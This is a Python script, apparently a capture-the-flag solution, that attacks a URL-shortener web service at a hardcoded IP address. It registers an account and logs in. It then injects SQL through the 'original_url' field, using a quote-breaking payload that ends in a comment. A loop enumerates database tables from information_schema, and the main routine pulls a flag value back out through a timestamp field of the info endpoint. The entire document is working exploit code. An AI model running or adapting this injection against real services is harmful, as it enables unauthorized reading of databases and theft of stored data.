import json
import requests
import uuid

url = 'http://121.4.73.103:3001/u'

def force(session):
    cnt = 0
    while True:
        query = f"SELECT table_name from information_schema.tables where table_catalog='url_shorter' limit 1 offset {cnt}"
        payload = f"https://baidu.com/$$,?,'123',({query}),0,false); --"
        rng = uuid.uuid4()
        requests.post(url=url + "/st", cookies={"session": session}, json={
            "original_url": payload,
            "verify_id": str(rng)
        })
        resp = requests.post(url=url + "/info", cookies={"session": session}, json={
            "verify_id_list": [str(rng)]
        })
        print(json.loads(resp.text)['data_list'][0]['latest_visit_at'])
        cnt += 1


if __name__ == '__main__':
    rng = uuid.uuid4()
    requests.post(url=url + "/register", json=["SilentESilentESilentE", "SilentESilentESilentE", True])
    r = requests.post(url=url + "/login", json=["SilentESilentESilentE", "SilentESilentESilentE"])
    database = "current_database()"
    flag = "select fflagg from public.tH3re_1s_fl4gg limit 1 offset 0"
    payload = f"https://baidu.com/$$,?,'123',({flag}),0,false); --"
    # force(r.headers['merak'][8:])
    s = requests.post(url=url + "/st", cookies={"session": r.headers['merak'][8:]}, json={
        "original_url": payload,
        "verify_id": str(rng)
    })
    print(s.text)
    resp = requests.post(url=url + "/info", cookies={"session": r.headers['merak'][8:]}, json={
        "verify_id_list": [str(rng)]
    })
    print(json.loads(resp.text))